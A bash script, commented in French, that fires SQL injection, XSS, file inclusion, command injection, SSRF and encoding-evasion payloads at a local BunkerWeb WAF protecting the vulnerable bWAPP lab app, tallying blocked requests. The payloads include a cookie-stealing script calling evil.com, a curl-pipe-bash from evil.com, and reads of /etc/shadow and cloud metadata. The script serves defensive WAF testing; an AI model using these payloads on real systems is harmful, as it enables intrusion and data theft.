#!/bin/bash
# ═══════════════════════════════════════════════════════════
#   Simulateur d'attaques WAF — BunkerWeb + Module IA
#   Cible : http://127.0.0.1:8080 (via BunkerWeb → Proxy IA → bWAPP)
# ═══════════════════════════════════════════════════════════

TARGET="http://127.0.0.1:8080"
DELAY=0.3  # secondes entre chaque requête

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Liste d'IPs publiques pour simuler différentes provenances (Géo-IP)
IPS=(
    "8.8.8.8"          # USA (Google)
    "51.159.24.101"    # France (Scaleway)
    "1.33.1.1"         # Japon
    "78.46.1.1"        # Allemagne (Hetzner)
    "185.199.108.153"  # USA (GitHub)
    "1.1.1.1"          # Australie (Cloudflare)
)

ok=0
blocked=0
total=0

fire() {
    local type="$1"
    local method="$2"
    local url="$3"
    local data="$4"
    local desc="$5"

    total=$((total+1))

    # Sélection d'une IP aléatoire pour cette requête
    RANDOM_IP=${IPS[$RANDOM % ${#IPS[@]}]}

    if [ "$method" = "POST" ]; then
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "$TARGET$url" \
            --data "$data" \
            -H "User-Agent: Mozilla/5.0 (AttackSim)" \
            -H "X-Forwarded-For: $RANDOM_IP" \
            --max-time 5 2>/dev/null)
    else
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X GET "$TARGET$url" \
            -H "User-Agent: Mozilla/5.0 (AttackSim)" \
            -H "X-Forwarded-For: $RANDOM_IP" \
            --max-time 5 2>/dev/null)
    fi

    if [ "$STATUS" = "403" ] || [ "$STATUS" = "400" ] || [ "$STATUS" = "429" ]; then
        blocked=$((blocked+1))
        echo -e "${RED}[BLOCKED $STATUS]${NC} ${YELLOW}[$type]${NC} $desc"
    elif [ "$STATUS" = "000" ]; then
        echo -e "${CYAN}[TIMEOUT]${NC}  ${YELLOW}[$type]${NC} $desc"
    else
        ok=$((ok+1))
        echo -e "${GREEN}[PASSED  $STATUS]${NC} ${YELLOW}[$type]${NC} $desc"
    fi

    sleep $DELAY
}

echo ""
echo "═══════════════════════════════════════════════════════"
echo "   🔥 SIMULATEUR D'ATTAQUES WAF-IA"
echo "   Cible : $TARGET"
echo "═══════════════════════════════════════════════════════"
echo ""

# ── SQL INJECTION ────────────────────────────────────────────
echo -e "${CYAN}━━━ SQL INJECTION ━━━${NC}"

fire "SQLi" GET "/sqli_1.php?title=test'+OR+'1'='1&action=search" "" "Classic OR 1=1"
fire "SQLi" GET "/sqli_1.php?title=1'+UNION+SELECT+1,2,3,4,5,6,7--&action=search" "" "UNION SELECT"
fire "SQLi" GET "/sqli_1.php?title=1';DROP+TABLE+users;--&action=search" "" "DROP TABLE"
fire "SQLi" GET "/sqli_1.php?title=1'+AND+1=1--&action=search" "" "AND 1=1"
fire "SQLi" POST "/sqli_1.php" "title=admin'--&action=search" "POST SQLi login bypass"
fire "SQLi" GET "/sqli_1.php?title=1+UNION+SELECT+table_name,2,3,4,5,6,7+FROM+information_schema.tables--" "" "Information schema dump"
fire "SQLi" GET "/sqli_blind.php?title=Iron+Man'+AND+SLEEP(5)--&action=search" "" "Blind SQLi SLEEP"
fire "SQLi" GET "/sqli_1.php?title='+OR+1=1+LIMIT+1;--+-" "" "SQLi LIMIT bypass"

echo ""

# ── XSS ─────────────────────────────────────────────────────
echo -e "${CYAN}━━━ XSS — Cross-Site Scripting ━━━${NC}"

fire "XSS" GET "/xss_get.php?firstname=<script>alert('XSS')</script>&lastname=test" "" "Reflected XSS script tag"
fire "XSS" GET "/xss_get.php?firstname=<img+src=x+onerror=alert(1)>&lastname=test" "" "XSS img onerror"
fire "XSS" GET "/xss_get.php?firstname=<svg+onload=alert(document.cookie)>&lastname=test" "" "XSS SVG onload"
fire "XSS" POST "/xss_stored_1.php" "entry=<script>document.location='http://evil.com/steal?c='+document.cookie</script>&owner=bee" "Stored XSS cookie theft"
fire "XSS" GET "/xss_get.php?firstname=javascript:alert(1)&lastname=x" "" "XSS javascript: protocol"
fire "XSS" GET "/xss_get.php?firstname=<iframe+src=javascript:alert('xss')>&lastname=x" "" "XSS iframe"
fire "XSS" GET "/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lastname=x" "" "XSS URL encoded"
fire "XSS" POST "/xss_stored_1.php" "entry=<body+onload=alert('XSS')>&owner=bee" "XSS body onload"

echo ""

# ── LFI — Local File Inclusion ───────────────────────────────
echo -e "${CYAN}━━━ LFI — Local File Inclusion ━━━${NC}"

fire "LFI" GET "/rlfi.php?language=../../../../../../etc/passwd&action=go" "" "LFI /etc/passwd"
fire "LFI" GET "/rlfi.php?language=../../../../../../etc/shadow&action=go" "" "LFI /etc/shadow"
fire "LFI" GET "/rlfi.php?language=../../../../../../../windows/win.ini&action=go" "" "LFI win.ini"
fire "LFI" GET "/rlfi.php?language=....//....//....//etc/passwd&action=go" "" "LFI double dot bypass"
fire "LFI" GET "/rlfi.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&action=go" "" "LFI URL encoded"
fire "LFI" GET "/rlfi.php?language=php://filter/convert.base64-encode/resource=index.php&action=go" "" "LFI PHP filter"
fire "LFI" GET "/rlfi.php?language=../../proc/self/environ&action=go" "" "LFI /proc/self/environ"
fire "LFI" GET "/directory_traversal_1.php?page=../../../../../../etc/passwd" "" "Directory traversal passwd"

echo ""

# ── RCE — Remote Code Execution ─────────────────────────────
echo -e "${CYAN}━━━ RCE — Remote Code Execution ━━━${NC}"

fire "RCE" GET "/commandi.php?target=127.0.0.1;cat+/etc/passwd&form=submit" "" "RCE ;cat /etc/passwd"
fire "RCE" GET "/commandi.php?target=127.0.0.1;id&form=submit" "" "RCE ;id"
fire "RCE" GET "/commandi.php?target=127.0.0.1;whoami&form=submit" "" "RCE ;whoami"
fire "RCE" GET "/commandi.php?target=127.0.0.1|ls+-la&form=submit" "" "RCE |ls -la"
fire "RCE" GET "/commandi.php?target=127.0.0.1&&uname+-a&form=submit" "" "RCE &&uname"
fire "RCE" POST "/commandi.php" "target=127.0.0.1%3Bcat+/etc/shadow&form=submit" "RCE POST cat shadow"
fire "RCE" GET "/commandi.php?target=\$(curl+http://evil.com/shell.sh|bash)&form=submit" "" "RCE curl pipe bash"
fire "RCE" GET "/commandi.php?target=127.0.0.1%0aid%0a&form=submit" "" "RCE newline injection"

echo ""

# ── SSRF — Server-Side Request Forgery ──────────────────────
echo -e "${CYAN}━━━ SSRF — Server-Side Request Forgery ━━━${NC}"

fire "SSRF" GET "/ssrf_1.php?url=http://127.0.0.1/admin" "" "SSRF localhost admin"
fire "SSRF" GET "/ssrf_1.php?url=http://169.254.169.254/latest/meta-data/" "" "SSRF AWS metadata"
fire "SSRF" GET "/ssrf_1.php?url=file:///etc/passwd" "" "SSRF file:// protocol"
fire "SSRF" GET "/ssrf_1.php?url=http://192.168.1.1/admin" "" "SSRF internal network"
fire "SSRF" GET "/ssrf_1.php?url=gopher://127.0.0.1:6379/_PING" "" "SSRF gopher Redis"
fire "SSRF" GET "/ssrf_1.php?url=dict://127.0.0.1:11211/stat" "" "SSRF dict Memcached"
fire "SSRF" GET "/ssrf_1.php?url=http://10.89.1.40:8000/admin" "" "SSRF internal IA module"
fire "SSRF" GET "/ssrf_1.php?url=http://0.0.0.0:22" "" "SSRF port scan SSH"

echo ""

# ── ZERO-DAY / Obfuscation ───────────────────────────────────
echo -e "${CYAN}━━━ ZERO-DAY / Obfuscation ━━━${NC}"

fire "ZeroDay" GET "/sqli_1.php?title=%27%20%4fR%20%31%3d%31%20%2d%2d&action=search" "" "SQLi heavy URL encoding"
fire "ZeroDay" GET "/xss_get.php?firstname=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E" "" "Double URL encoded XSS"
fire "ZeroDay" GET "/page.php?id=../../../../%00etc/passwd" "" "Null byte injection"
fire "ZeroDay" GET "/page.php?cmd=`id`&exec=1" "" "Backtick command injection"
fire "ZeroDay" GET "/api?data=%27%3B%20exec%20xp_cmdshell%28%27dir%27%29--%20" "" "MSSQL xp_cmdshell"
fire "ZeroDay" GET "/page.php?x=1;SELECT/**/1,2,3/**/FROM/**/users--" "" "SQLi comment obfuscation"
fire "ZeroDay" GET "/?search=<ScRiPt>alert(1)</sCrIpT>" "" "XSS mixed case"
fire "ZeroDay" GET "/?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E" "" "Unicode encoded XSS"

echo ""

# ── Résumé ───────────────────────────────────────────────────
echo "═══════════════════════════════════════════════════════"
echo -e "  📊 RÉSUMÉ"
echo "═══════════════════════════════════════════════════════"
echo -e "  Total requêtes  : ${CYAN}$total${NC}"
echo -e "  Bloquées (WAF)  : ${RED}$blocked${NC}"
echo -e "  Passées         : ${GREEN}$ok${NC}"
echo -e "  Taux blocage    : ${YELLOW}$(( blocked * 100 / total ))%${NC}"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "  → Vérifie le SIEM : http://127.0.0.1:5001"
echo "  → Stats IA        : http://127.0.0.1:8000/stats"
echo "  → Stats Proxy     : http://127.0.0.1:9000/ia/stats"
echo "═══════════════════════════════════════════════════════"
